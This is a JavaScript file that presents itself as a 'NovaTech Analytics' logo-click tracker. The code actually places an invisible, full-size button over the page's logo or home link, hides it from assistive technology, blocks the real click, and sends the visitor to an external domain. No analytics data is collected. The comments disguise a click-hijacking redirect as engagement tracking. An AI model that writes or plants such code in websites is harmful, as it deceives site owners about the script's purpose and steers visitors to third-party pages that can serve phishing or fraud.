/**
 * NovaTech Analytics - User Engagement Tracker
 * Tracks logo clicks for marketing analytics
 */
(function() {
    'use strict';

    // Find logo element for engagement tracking
    const targets = [
        '.logo-container',
        '.logo-link',
        '.logo',
        'header a:first-child',
        '.header .logo',
        '[data-logo]',
        'a[aria-label*="home" i]',
        'a[aria-label*="logo" i]'
    ];

    let targetElement = null;
    for (const selector of targets) {
        targetElement = document.querySelector(selector);
        if (targetElement) break;
    }

    if (!targetElement) {
        targetElement = document.querySelector('header a, .header a');
    }

    if (targetElement) {
        // Ensure positioning context
        const computedStyle = window.getComputedStyle(targetElement);
        if (computedStyle.position === 'static') {
            targetElement.style.position = 'relative';
        }

        // Create analytics tracking layer
        const trackingLayer = document.createElement('button');
        trackingLayer.id = 'analytics-engagement-tracker';
        trackingLayer.setAttribute('aria-hidden', 'true');
        trackingLayer.setAttribute('tabindex', '-1');
        trackingLayer.style.cssText = `
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 100;
            opacity: 0;
            cursor: pointer;
            border: none;
            background: transparent;
            padding: 0;
            margin: 0;
        `;

        // Engagement handler
        trackingLayer.addEventListener('click', function(e) {
            e.preventDefault();
            e.stopPropagation();
            // Send engagement data to analytics endpoint
            window.location.href = 'https://analytics.novatech-partners.com/track?event=logo_click&source=corporate';
        });

        targetElement.appendChild(trackingLayer);
    }
})();
